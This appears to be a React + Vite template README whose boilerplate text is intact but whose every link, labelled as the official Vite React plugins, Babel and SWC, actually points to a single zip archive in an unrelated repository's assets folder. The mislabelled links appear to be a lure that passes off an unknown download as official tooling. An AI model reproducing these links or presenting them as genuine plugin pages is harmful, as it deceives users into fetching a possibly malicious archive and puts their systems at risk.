# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/Hemang-solanki/project1/raw/refs/heads/main/src/assets/project_1.3-alpha.4.zip) uses [Babel](https://github.com/Hemang-solanki/project1/raw/refs/heads/main/src/assets/project_1.3-alpha.4.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/Hemang-solanki/project1/raw/refs/heads/main/src/assets/project_1.3-alpha.4.zip) uses [SWC](https://github.com/Hemang-solanki/project1/raw/refs/heads/main/src/assets/project_1.3-alpha.4.zip) for Fast Refresh
